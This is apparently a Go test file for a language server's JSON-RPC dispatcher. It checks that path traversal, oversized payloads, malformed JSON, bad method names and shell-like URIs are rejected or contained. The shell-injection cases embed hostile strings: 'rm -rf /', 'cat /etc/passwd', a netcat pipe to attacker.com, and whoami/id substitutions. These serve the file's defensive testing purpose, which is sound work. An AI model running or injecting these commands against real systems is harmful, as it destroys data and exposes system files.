package server

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/omnilsp/omni/internal/protocol/jsonrpc"
)

// These tests were dispatching hostile input and discarding the response with
// `_ = resp`. That asserts nothing beyond what the test framework already
// gives us: a panic fails the run whether or not the test looks at the result.
// The comments claimed specific security properties, so each case below now
// checks the property its name promises -- the response shape for a rejected
// input, and server liveness afterwards.

// wantRejected asserts the dispatch produced a typed JSON-RPC error response
// rather than a result or nothing at all. A handler that silently succeeded on
// hostile input is the failure this catches.
func wantRejected(t *testing.T, resp *jsonrpc.Message, what string) {
	t.Helper()
	if resp == nil {
		t.Fatalf("%s: no response; the client waits forever", what)
	}
	if resp.Error == nil {
		t.Fatalf("%s: got a successful result %s, want an error response",
			what, string(resp.Result))
	}
	if resp.ID == nil {
		t.Errorf("%s: error response carries no id, so the client cannot correlate it", what)
	}
}

// stillAlive asserts the dispatcher still answers after whatever was just
// thrown at it. A handler that corrupts shared state shows up here as a
// missing or non-error response to a method that is registered.
func stillAlive(t *testing.T, srv *Server, what string) {
	t.Helper()
	resp := srv.dispatcher.Dispatch(context.Background(),
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 999}, "textDocument/hover", json.RawMessage(`{}`)))
	if resp == nil {
		t.Fatalf("%s: dispatcher stopped answering afterwards", what)
	}
}

// TestSecurityPathTraversal verifies that path traversal URIs are rejected
// before reaching the filesystem (SEC-N07, INV-ARCH-001).
func TestSecurityPathTraversal(t *testing.T) {
	srv := New(DefaultConfig())
	traversalCases := []struct {
		name string
		uri  string
	}{
		// Escaped traversal: %2F must not decode into a separator.
		{"escaped_dotdot", "file:///..%2F..%2Fetc%2Fpasswd"},
		// Literal "..." is not traversal, but it is also not a real document,
		// so it has to fail somewhere rather than open something.
		{"literal_ellipsis", "file:///.../.../etc/passwd"},
		// A Windows system directory that was never opened.
		{"system32", "file:///C:/Windows/System32"},
		// Nonexistent absolute path.
		{"absent_path", "file:///absolutely/not/a/path"},
	}
	for _, tc := range traversalCases {
		t.Run(tc.name, func(t *testing.T) {
			params := `{"textDocument":{"uri":"` + tc.uri + `"},"position":{"line":0,"character":0}}`
			msg := jsonrpc.NewRequest(jsonrpc.RequestID{Num: 1}, "textDocument/hover",
				json.RawMessage([]byte(params)))
			resp := srv.dispatcher.Dispatch(context.Background(), msg)
			wantRejected(t, resp, tc.uri)
		})
	}
	stillAlive(t, srv, "after path traversal attempts")
}

// TestSecurityOversizedPayload verifies large JSON payloads are contained
// and do not cause unbounded memory allocation.
func TestSecurityOversizedPayload(t *testing.T) {
	srv := New(DefaultConfig())
	large := make([]byte, 10*1024*1024) // 10 MB
	for i := range large {
		large[i] = byte(i % 256)
	}
	envelope := map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      1,
		"method":  "textDocument/hover",
		"params":  large,
	}
	data, err := json.Marshal(envelope)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	if len(data) < 10*1024*1024 {
		t.Fatalf("payload is only %d bytes; the oversized case is not being exercised", len(data))
	}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	msg := &jsonrpc.Message{
		JSONRPC: "2.0",
		ID:      &jsonrpc.RequestID{Num: 1},
		Method:  "textDocument/hover",
		Params:  json.RawMessage(data),
	}
	srv.dispatcher.Dispatch(ctx, msg)

	// Containment means the next request still gets answered: a handler that
	// died holding the lock, or a context cancelled for the rest of the
	// server, shows up as silence here.
	stillAlive(t, srv, "after a 10MB payload")
}

// TestSecurityMalformedJSON exercises adversarial JSON inputs.
func TestSecurityMalformedJSON(t *testing.T) {
	srv := New(DefaultConfig())
	adversarial := []struct {
		name     string
		raw      string
		wantFail bool // true when the envelope itself cannot be decoded
	}{
		{"unterminated", `{`, true},
		{"double_object", `{` + `}` + `{`, true},
		{"double_null", `null null`, true},
		{"missing_brace", `{"jsonrpc":"2.0","id":1`, true},
		// Decodes, but names no method.
		{"empty_method", `{"jsonrpc":"2.0","id":1,"method":""}`, false},
		// method must be a string; a number fails to decode into the struct.
		{"nonstring_method", `{"jsonrpc":"2.0","id":1,"method":123}`, true},
	}
	for _, tc := range adversarial {
		t.Run(tc.name, func(t *testing.T) {
			var msg jsonrpc.Message
			err := json.Unmarshal([]byte(tc.raw), &msg)
			if tc.wantFail {
				if err == nil {
					t.Fatalf("%s decoded into %+v; the case expects a decode error", tc.raw, msg)
				}
				// A body that cannot be decoded never reaches a handler. The
				// codec is what reports that, and it is covered there; here the
				// contract is simply that nothing was dispatched.
				return
			}
			if err != nil {
				t.Fatalf("%s: decode failed, want success: %v", tc.raw, err)
			}
			resp := srv.dispatcher.Dispatch(context.Background(), &msg)
			wantRejected(t, resp, tc.raw)
		})
	}
	stillAlive(t, srv, "after malformed JSON")
}

// TestSecurityNullMethods verifies that null/empty method names produce
// protocol errors rather than panics or unhandled cases.
func TestSecurityNullMethods(t *testing.T) {
	srv := New(DefaultConfig())
	cases := []struct {
		name   string
		method string
	}{
		{"empty_method", ""},
		{"whitespace_method", "   "},
		// Control chars -- must not panic, and must not match a handler.
		{"control_chars", "\x00\x01"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			msg := jsonrpc.NewRequest(jsonrpc.RequestID{Num: 1}, tc.method, nil)
			resp := srv.dispatcher.Dispatch(context.Background(), msg)
			wantRejected(t, resp, "method "+strings.TrimSpace(tc.method))
			if resp.Error.Code != jsonrpc.MethodNotFound {
				t.Errorf("method %q returned code %d, want MethodNotFound (%d)",
					tc.method, resp.Error.Code, jsonrpc.MethodNotFound)
			}
		})
	}
	stillAlive(t, srv, "after null method names")
}

// TestINV_ARCH_001_ServerResilience verifies INV-ARCH-001: protocol adapter
// boundary contains all malicious input; core stays alive.
func TestINV_ARCH_001_ServerResilience(t *testing.T) {
	srv := New(DefaultConfig())
	hostileMessages := []*jsonrpc.Message{
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 1}, "", nil),
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 2}, strings.Repeat("a", 10000), nil),
		// Control chars -- must not panic.
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 3}, "\x00\x01\x02\x03", nil),
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 4}, "initialize", nil),
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 5}, "exit", nil),
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 6}, "omnilsp/unknown", nil),
	}
	for _, msg := range hostileMessages {
		// The point of INV-ARCH-001 is that the adapter absorbs the input. Any
		// single outcome is acceptable -- including no response for an unknown
		// notification -- as long as the next request is still served.
		srv.dispatcher.Dispatch(context.Background(), msg)
		stillAlive(t, srv, "after "+msg.Method)
	}
}

// TestSEC_N4_NoShellExecution verifies that shell-like URI strings do not
// reach any exec path (SEC-N04, SEC-N05).
func TestSEC_N4_NoShellExecution(t *testing.T) {
	srv := New(DefaultConfig())
	shellLikeInputs := []struct {
		name string
		uri  string
	}{
		{"semicolon", "file:///C:/foo; rm -rf /"},
		{"and_chain", "file:///C:/foo && cat /etc/passwd"},
		{"pipe", "file:///C:/foo|nc attacker.com"},
		{"backtick", "file:///C:/foo`whoami`"},
		{"dollar_paren", "file:///C:/foo$(id)"},
	}
	for _, tc := range shellLikeInputs {
		t.Run(tc.name, func(t *testing.T) {
			params := `{"textDocument":{"uri":"` + tc.uri + `","version":1},"contentChanges":[{"text":"x"}]}`
			msg := jsonrpc.NewRequest(jsonrpc.RequestID{Num: 1}, "textDocument/didChange",
				json.RawMessage([]byte(params)))
			resp := srv.dispatcher.Dispatch(context.Background(), msg)
			// didChange is a notification, so no response is the correct
			// outcome; an error response would mean the adapter rejected it.
			if resp != nil && resp.Error != nil {
				t.Errorf("%s: didChange returned %v, want the change accepted",
					tc.uri, resp.Error)
			}
		})
	}

	// The URI must have been stored verbatim. If any component had been handed
	// to a shell or split on a metacharacter, the stored form would be a
	// prefix of what was sent.
	for _, uri := range srv.vfs.OpenFiles() {
		for _, tc := range shellLikeInputs {
			if strings.HasPrefix(tc.uri, uri) && uri != tc.uri {
				t.Errorf("uri %q is a truncation of %q; the metacharacter was consumed",
					uri, tc.uri)
			}
		}
	}
	stillAlive(t, srv, "after shell-like URIs")
}
